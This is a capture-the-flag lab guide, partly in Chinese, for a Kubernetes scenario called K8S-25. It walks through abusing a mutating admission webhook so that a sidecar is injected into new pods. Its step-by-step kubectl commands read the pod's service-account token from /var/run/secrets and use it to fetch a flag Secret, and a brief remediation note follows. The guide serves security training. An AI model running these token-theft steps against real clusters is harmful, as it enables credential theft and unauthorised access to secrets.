# K8S-25: Mutating Webhook Sidecar Injection

## 场景信息

| 字段 | 值 |
|---|---|
| ID | K8S-25 |
| 名称 | Mutating Webhook Sidecar Injection |
| 技术/CVE | N/A (admission control abuse) |
| 难度 | L2 |
| 交付方式 | KIND / Kubernetes |
| 入口 | KIND 集群内入口（无固定宿主端口） |

## 场景概述
- 技术：N/A (admission control abuse)
- 难度：L2
- 交付方式：k8s
## 攻击路径与利用步骤

## Overview
| Property | Value |
|----------|-------|
| CVE | N/A (admission control abuse) |
| Difficulty | L2 |
| Type | k8s |
| Cluster Name | cve-k8s-25-webhook-inject |
| Attack Vector | Mutating admission webhook injects malicious sidecar → token theft |

## Attack Path

```
Attacker discovers mutating webhook → Webhook injects sidecar into new pods
  → Sidecar reads SA token from injected pods → Use token to read flag Secret
```

## Step-by-Step Exploitation

### Step 1: Discover the Mutating Webhook

```bash
kubectl get mutatingwebhookconfigurations
# OR check pod annotations for injected sidecars
kubectl describe pod -n target-ns -l app=target-app
# Note: injected-sidecar container added by webhook
```

### Step 2: Create a New Pod to Trigger Sidecar Injection

```bash
kubectl run trigger-pod --image=nginx:1.24-alpine -n target-ns -- sleep 3600
# The mutating webhook injects a sidecar automatically
```

### Step 3: Examine Injected Sidecar

```bash
kubectl get pod trigger-pod -n target-ns -o yaml | grep -A20 injected-sidecar
# The sidecar reads the pod's SA token into /sidecar.log
kubectl exec -n target-ns trigger-pod -c injected-sidecar -- cat /sidecar.log
```

### Step 4: Use SA Token to Read Flag Secret

```bash
# Get the SA token from the injected sidecar's log
TOKEN=$(kubectl exec -n target-ns trigger-pod -c injected-sidecar -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# Read the flag Secret
kubectl get secret vault-flag -n target-ns -o jsonpath='{.data.flag}' | base64 -d
# Output: flag{k8s-25-<16-hex>}
```

## Flag Location
- **Primary**: Secret `vault-flag` in `target-ns` namespace
- **Hint**: ConfigMap `app-config` in `target-ns` has `flag_hint` key
- **Format**: `flag{k8s-25-<16-hex>}`

## Verification
```bash
cd cve_challenges/scenarios/k8s/webhook-inject && bash deploy.sh
kubectl get secret vault-flag -n target-ns -o jsonpath='{.data.flag}' | base64 -d
bash teardown.sh
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | Admission webhooks, TLS, and pod mutation |
| 侦察与前置条件 | MutatingWebhookConfiguration scope and trusted namespace targets |
| 核心漏洞与利用 | Register or control a mutating webhook to inject a sidecar |
| 权限、横向或影响 | Workload credential interception/execution |
| 验证 | Use the injected sidecar to retrieve the flag |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
